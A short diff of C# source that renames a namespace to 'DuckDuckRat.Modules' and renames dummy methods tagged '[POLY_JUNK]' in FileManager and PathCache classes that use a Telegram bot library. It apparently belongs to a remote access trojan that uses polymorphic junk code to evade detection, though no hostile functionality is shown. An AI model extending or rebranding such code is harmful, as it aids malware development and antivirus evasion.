@@ -4,12 +4,12 @@ using System.IO;
 using System.Linq;
 using Telegram.Bot.Types.ReplyMarkups;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class FileManager
     {
         // [POLY_JUNK]
-        private static void _vanguard_2e36172c() {
+        private static void _DuckDuckRat_2e36172c() {
             int val = 67179;
             if (val > 50000) Console.WriteLine("Hash:" + 67179);
         }
@@ -126,7 +126,7 @@ namespace FinalBot.Modules
     public static class PathCache
     {
         // [POLY_JUNK]
-        private static void _vanguard_2e36172c() {
+        private static void _DuckDuckRat_2e36172c() {
             int val = 67179;
             if (val > 50000) Console.WriteLine("Hash:" + 67179);
         }
@@ -150,3 +150,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
